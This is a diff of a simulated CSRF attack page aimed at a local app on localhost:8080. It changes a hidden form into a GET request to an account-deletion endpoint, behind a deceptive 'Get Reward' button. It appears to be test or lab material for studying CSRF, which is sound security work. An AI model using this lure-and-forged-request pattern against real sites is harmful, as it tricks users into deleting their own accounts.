@@ -9,9 +9,9 @@
 <h1>Simulated CSRF Attack with User Interaction</h1>
 <p>If you click the button below, a DELETE request will be sent to delete your account.</p>
 
-<form id="csrf-form" action="http://localhost:8080/api/user/self" method="POST">
+<form id="csrf-form" action="http://localhost:8080/api/user/self/delete" method="GET">
     <!-- Hidden field to simulate DELETE method -->
-    <input type="hidden" name="_method" value="DELETE">
+    <input type="hidden" name="_method" value="GET">
 
     <!-- Submit button that user must click -->
     <button type="submit">Get Reward</button>
